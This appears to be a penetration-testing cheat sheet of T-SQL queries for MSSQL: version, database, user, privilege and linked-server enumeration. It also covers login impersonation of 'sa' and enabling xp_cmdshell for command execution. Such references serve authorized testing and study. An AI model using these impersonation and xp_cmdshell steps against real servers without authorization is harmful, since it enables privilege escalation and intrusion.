# MSSQL

#### Version Detection

```zsh
# Get SQL Server version
SELECT @@version;

# Get product version
SELECT SERVERPROPERTY('ProductVersion');
SELECT SERVERPROPERTY('ProductLevel');
SELECT SERVERPROPERTY('Edition');

# Get machine name
SELECT @@SERVERNAME;
SELECT SERVERPROPERTY('MachineName');
```

#### Database Enumeration

```zsh
# List all databases
SELECT name FROM sys.databases;
SELECT name FROM master.dbo.sysdatabases;

# Current database
SELECT DB_NAME();

# List Permissions You Have in the Current Database
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');

# Dump all tables from current DB
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

```

#### User Enumeration

```zsh
# List all users
SELECT name FROM master.sys.server_principals;
SELECT name FROM sys.sysusers;

# Current user
SELECT USER_NAME();
SELECT SYSTEM_USER;
SELECT CURRENT_USER;

# User privileges
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

# List sysadmin users
SELECT name FROM master.sys.server_principals 
WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
```

#### Table and Column Enumeration

```zsh
# List tables in current database
SELECT table_name FROM information_schema.tables;

# List all columns in a table
SELECT * FROM users;

```

#### Privilege Enumeration

```zsh
# Check if current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

# Check server roles
SELECT name FROM master.sys.server_principals 
WHERE type = 'R';

# Current user permissions
EXEC sp_helprotect;

# Identifying users we can impersonate
SELECT sp.name FROM sys.server_permissions p JOIN sys.server_principals sp ON p.major_id=sp.principal_id WHERE p.permission_name='IMPERSONATE' AND p.grantee_principal_id=SUSER_ID();

# Impersonate a user
EXECUTE as LOGIN = 'sa';

# Database role members
EXEC sp_helprolemember;
```

#### Linked Server Enumeration

```zsh
# List linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

# Test linked server connection
SELECT * FROM OPENQUERY([LinkedServerName], 'SELECT @@version');

# Execute on linked server
EXEC ('SELECT @@version') AT [LinkedServerName];
```

#### Code execution

```zsh
# Enabling XP_CMDSHELL
EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# RCE
EXEC xp_cmdshell 'whoami';
```
